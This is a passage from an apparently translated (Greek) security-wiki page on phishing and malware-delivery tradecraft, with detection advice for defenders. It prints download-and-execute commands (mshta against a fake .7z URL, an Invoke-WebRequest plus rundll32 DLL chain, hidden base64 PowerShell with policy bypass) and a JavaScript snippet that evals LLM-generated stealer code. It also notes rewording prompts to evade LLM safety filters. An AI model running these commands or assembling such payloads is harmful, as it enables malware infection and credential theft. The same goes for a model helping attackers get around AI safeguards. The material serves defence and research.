cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Βασικά χαρακτηριστικά:
- Το hook συνήθως εκτελείται στη **capture phase** (`true`) στο `document`, επομένως ενεργοποιείται πριν από τα site handlers.
- Το Chrome χρησιμοποιεί συχνά `mousedown` αντί για `click`, ώστε η ανακατεύθυνση να παραμένει συνδεδεμένη με ένα έγκυρο **user gesture** και να βελτιώνεται το popup-blocker bypass.
- Ορισμένες παραλλαγές ανοίγουν προκαταβολικά το `about:blank` ή προσομοιώνουν clicks σε `<a target="_blank">` και αναθέτουν το TDS URL μόνο αργότερα.
- Τα browser-side όρια συχνά αποθηκεύονται στο `localStorage`, επομένως το **πρώτο click** μπορεί να οδηγήσει στο malware, ενώ τα refreshes/retries επιστρέφουν στο φαινομενικά benign visible link.
- Το TDS μπορεί να εφαρμόζει ελέγχους βάσει referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context και counters ανά session, καθιστώντας τα replays των analysts μη ντετερμινιστικά.

Ιδέες για Defenders:
- Συγκρίνετε το **displayed** `href` με τον **actual** navigation target που δημιουργείται τη στιγμή του click.
- Αναζητήστε handlers του `document.addEventListener(..., true)` που καλούν τόσο `preventDefault()` όσο και `stopImmediatePropagation()` γύρω από `window.open`, `about:blank` ή synthetic anchor clicks.
- Αντιμετωπίστε συστάδες από domains λήψης software που καταχωρίστηκαν πρόσφατα και φορτώνουν όλα το ίδιο CloudFront/JS stage ως pattern υψηλής ένδειξης για SEO-poisoning/TDS.

### ClickFix από fake verification pages + archive-looking LOLBAS fetches
Ορισμένα TDS branches καταλήγουν σε μια fake verification page (τύπου Cloudflare/IUAM), η οποία ζητά από το θύμα να εκτελέσει ένα trusted Windows binary, όπως:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Σημειώσεις:
- Το `mshta.exe` εκτελεί το **HTA/VBScript στην αρχή της απόκρισης**, ακόμη και αν το URL προσποιείται ότι οδηγεί σε αρχείο `.7z`· τα δεδομένα archive που έχουν προσαρτηθεί μπορεί να είναι καθαρά παραπλανητικά.
- Τα επόμενα stages συχνά συνεχίζουν να παραποιούν τον τύπο αρχείου (`.rtf` για PowerShell, `.asar` για Python, ZIP με binaries με padding) και στη συνέχεια μεταβαίνουν σε **manual PE mapping / in-memory execution**.
- Αν ανταποκρίνεστε σε κάποια από αυτές τις αλυσίδες, διατηρήστε τα **network + memory από το πρώτο επιτυχημένο run**: τα μεταγενέστερα replays μπορεί να εμφανίζουν μόνο μια benign διαδρομή installer/SFX ή να αποτυγχάνουν, επειδή το payload/key release ήταν συνδεδεμένο με το αρχικό TDS session.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Δόλωμα: cloned advisory εθνικού CERT με κουμπί **Update**, το οποίο εμφανίζει οδηγίες “fix” βήμα προς βήμα. Τα θύματα καλούνται να εκτελέσουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.<sup>[[12]](#references)</sup>
* Τυπική batch chain που παρατηρήθηκε:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* Το `Invoke-WebRequest` αποθηκεύει το payload στο `%TEMP%`, ένα σύντομο sleep αποκρύπτει το network jitter και στη συνέχεια το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL στέλνει beacon με την ταυτότητα του host και κάνει poll στο C2 κάθε λίγα λεπτά. Το remote tasking φτάνει ως **base64-encoded PowerShell**, το οποίο εκτελείται hidden και με policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει tasks χωρίς ενημέρωση του DLL) και αποκρύπτει τα console windows. Αναζητήστε PowerShell children του `rundll32.exe` που χρησιμοποιούν μαζί `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Οι defenders μπορούν να αναζητήσουν HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και polling intervals 5 λεπτών μετά το DLL load.

---

## AI-Enhanced Phishing Operations
Οι attackers πλέον συνδυάζουν **LLM & voice-clone APIs** για πλήρως personalised lures και interaction σε πραγματικό χρόνο.

| Layer | Παράδειγμα χρήσης από threat actor |
|-------|------------------------------------|
|Automation|Δημιουργία και αποστολή >100 k emails / SMS με randomised wording και tracking links.|
|Generative AI|Παραγωγή *one-off* emails που αναφέρονται σε δημόσια M&A και inside jokes από social media· deep-fake CEO voice σε callback scam.|
|Agentic AI|Αυτόνομη καταχώριση domains, scraping open-source intel και δημιουργία next-stage mails όταν ένα θύμα κάνει click αλλά δεν υποβάλλει creds.|

**Defence:**
• Προσθέστε **dynamic banners** που επισημαίνουν messages τα οποία αποστέλλονται από untrusted automation (μέσω ARC/DKIM anomalies).
• Αναπτύξτε **voice-biometric challenge phrases** για phone requests υψηλού κινδύνου.
• Εκτελείτε συνεχώς simulations με AI-generated lures σε awareness programmes – τα static templates είναι πλέον obsolete.

Δείτε επίσης – agentic browsing abuse για credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Δείτε επίσης – AI agent abuse τοπικών CLI tools και MCP (για secrets inventory και detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Οι attackers μπορούν να αποστέλλουν HTML που φαίνεται benign και να **δημιουργούν τον stealer κατά το runtime**, ζητώντας JavaScript από ένα **trusted LLM API** και στη συνέχεια εκτελώντας το μέσα στον browser (π.χ. `eval` ή dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** κωδικοποιήστε exfil URLs/Base64 strings στο prompt· επαναλάβετε τη διατύπωση για να παρακάμψετε τα safety filters και να μειώσετε τα hallucinations.
2. **Client-side API call:** κατά το load, το JS καλεί ένα public LLM (Gemini/DeepSeek/etc.) ή ένα CDN proxy· μόνο το prompt/API call υπάρχει στο static HTML.
3. **Assemble & exec:** συνενώστε την απόκριση και εκτελέστε την (polymorphic ανά visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** ο παραγόμενος κώδικας εξατομικεύει το lure (π.χ. LogoKit token parsing) και δημοσιεύει τα creds στο prompt-hidden endpoint.

**Χαρακτηριστικά Evasion**
- Η κίνηση περνά από γνωστά LLM domains ή αξιόπιστους CDN proxies, μερικές φορές μέσω WebSockets προς ένα backend.
- Δεν υπάρχει static payload· κακόβουλο JS υπάρχει μόνο μετά το render.
- Οι μη-ντετερμινιστικές γενιές παράγουν **μοναδικούς stealers** ανά session.

**Ιδέες για Detection**
- Εκτελέστε sandboxes με ενεργοποιημένο JS· επισημάνετε **runtime `eval`/dynamic script creation που προέρχεται από LLM responses**.
- Αναζητήστε front-end POSTs προς LLM APIs, τα οποία ακολουθούνται αμέσως από `eval`/`Function` στο επιστρεφόμενο κείμενο.
- Δημιουργήστε alert για μη εξουσιοδοτημένα LLM domains στην client traffic και επακόλουθα credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Εκτός από το κλασικό push-bombing, οι operators απλώς **επιβάλλουν μια νέα MFA registration** κατά τη διάρκεια της κλήσης στο help desk, ακυρώνοντας το υπάρχον token του χρήστη. Οποιοδήποτε subsequent login prompt εμφανίζεται στον victim ως legitimate.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Παρακολουθείτε events στο AzureAD/AWS/Okta όπου τα **`deleteMFA` + `addMFA`** πραγματοποιούνται **μέσα σε λίγα λεπτά από την ίδια IP**.



## Clipboard Hijacking / Pastejacking

Οι attackers μπορούν να αντιγράψουν αθόρυβα κακόβουλες εντολές στο clipboard του θύματος από μια compromised ή typosquatted web page και στη συνέχεια να παραπλανήσουν τον χρήστη ώστε να τις κάνει paste μέσα στο **Win + R**, το **Win + X** ή ένα terminal window, εκτελώντας arbitrary code χωρίς download ή attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Διανομή Κακόβουλων Εφαρμογών (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijack σύνδεσης συσκευής WhatsApp μέσω QR social engineering
* Μια lure page (π.χ. fake ministry/CERT “channel”) εμφανίζει ένα WhatsApp Web/Desktop QR και instructs το θύμα να το σαρώσει, προσθέτοντας αθόρυβα τον attacker ως **linked device**.<sup>[[12]](#references)</sup>
* Ο attacker αποκτά αμέσως ορατότητα στα chats και τις επαφές μέχρι να αφαιρεθεί το session. Τα θύματα ενδέχεται αργότερα να δουν μια ειδοποίηση “new device linked”. Οι defenders μπορούν να αναζητούν unexpected device-link events λίγο μετά από επισκέψεις σε untrusted QR pages.

### Mobile‑gated phishing για την αποφυγή crawlers/sandboxes
Οι operators περιορίζουν ολοένα και περισσότερο τις phishing flows πίσω από έναν απλό device check, ώστε οι desktop crawlers να μην φτάνουν ποτέ στις τελικές pages. Ένα συνηθισμένο pattern είναι ένα μικρό script που ελέγχει αν υπάρχει touch-capable DOM και κάνει post το αποτέλεσμα σε ένα server endpoint. Οι non‑mobile clients λαμβάνουν HTTP 500 (ή μια κενή page), ενώ στους mobile users σερβίρεται ολόκληρη η flow.<sup>[[7]](#references)</sup>

Minimal client snippet (τυπική λογική):
```html
<script src="/static/detect_device.js"></script>
```
Λογική του `detect_device.js` (απλοποιημένη):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Συμπεριφορά server που παρατηρείται συχνά:
- Ορίζει ένα session cookie κατά το πρώτο load.
- Αποδέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) σε επόμενα GET όταν `is_mobile=false`; σερβίρει phishing μόνο αν είναι `true`.

Heuristics για hunting και detection:
- Ερώτημα urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για non-mobile· τα νόμιμα paths θυμάτων mobile επιστρέφουν 200 με επακόλουθο HTML/JS.
- Κάντε block ή ελέγξτε προσεκτικά σελίδες που καθορίζουν το περιεχόμενο αποκλειστικά βάσει του `ontouchstart` ή παρόμοιων device checks.

Συμβουλές άμυνας:
- Εκτελείτε crawlers με mobile-like fingerprints και ενεργοποιημένο JS, ώστε να αποκαλύπτεται το gated content.
- Δημιουργήστε alert για ύποπτες αποκρίσεις 500 μετά από `POST /detect` σε domains που καταχωρίστηκαν πρόσφατα.

## References

- [1] [Δημιουργία παραλλαγών domain που χρησιμοποιούνται σε phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Εντοπισμός phishing: Εργαλεία και τεχνικές (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Κλοπή credentials και παράκαμψη 2FA με noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Κλοπή sessions και παράκαμψη 2FA με EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Πώς να εγκαταστήσετε και να ρυθμίσετε DKIM με Postfix στο Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Παγκόσμια αναφορά Unit 42 για Incident Response του 2025 – Έκδοση Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing υποδομές και heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Το επόμενο σύνορο των Runtime Assembly Attacks: Αξιοποίηση LLMs για τη δημιουργία phishing JavaScript σε πραγματικό χρόνο](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking και TDS: Στο εσωτερικό ενός οικοσυστήματος διανομής malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Hijacking traffic προς το windows.com της Microsoft με bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: Ψεύτικη εφαρμογή dating χρησιμοποιήθηκε ως δόλωμα σε στοχευμένη εκστρατεία spyware στο Πακιστάν](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs και samples του ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
